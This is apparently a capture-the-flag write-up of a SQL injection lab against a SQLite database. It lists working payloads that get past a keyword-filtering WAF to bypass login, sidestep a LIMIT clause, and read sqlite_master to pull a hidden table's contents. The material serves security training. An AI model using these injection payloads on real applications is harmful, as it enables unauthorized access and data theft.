# Database Reincursion

## Overview

**Database Reincursion** is a SQL Injection write-up focusing on:
- Authentication bypass under keyword-filtering WAF
- Result set manipulation to bypass hard `LIMIT` constraints
- Privilege escalation via inconsistent input validation
- SQLite-specific metadata abuse

**Techniques:** UNION-based SQLi, logic substitution, metadata enumeration  
**Database:** SQLite  
**Difficulty:** Base

## 1. Authentication Bypass

**Reconnaissance:**

- **Standard payload**: `' or 1=1-- -` triggered a custom error: **Input rejected by security filter.**
- **Blocked**: The word `or` and `--`.

**Exploitation:**

The security filter blocks the patterns ` or ` and ` --`.

```sql
x' union select null,null,null/*
x' IS NOT '2'/*
x' LIKE '%'/*
```

## 2. Passcode Retrieval

**Reconnaissance:**

- Searching for `Kiwi` returned 4 results (IDs 10, 11, 12, 13) with no passcode in the notes.
- Triggering an error revealed a query constraint: `LIMIT 4`.

**Exploitation:** To bypass the `LIMIT 4` and find hidden entries, the query was modified to filter out the known IDs.

```sql
Kiwi' and id>13/*
Kiwi' and Department='Management'/*
```

## 3. Admin Panel & Flag Extraction

**Reconnaissance:**

- The page allows querying the `reports` table.
- **Metadata Directory** listed a table named `REDACTED`.

**Exploitation:**

1. **Table Discovery:**

```sql
 x' union select sql,2,3,4 from sqlite_master/*
 x' union select * from metadata/*
```

   - Result: Discovered hidden table `CITADEL_ARCHIVE_2077` with column `secrets`.

2. **Flag Retrieval:**

```sql
x' union select *,2,3,4 from CITADEL_ARCHIVE_2077/*
```

## Key Takeaways

- Keyword-based WAF rules are fragile and easily bypassed
- Inconsistent filtering across endpoints enables privilege escalation
- Hard-coded query limits can be bypassed through result filtering
- SQLite metadata tables (`sqlite_master`) expose critical schema information
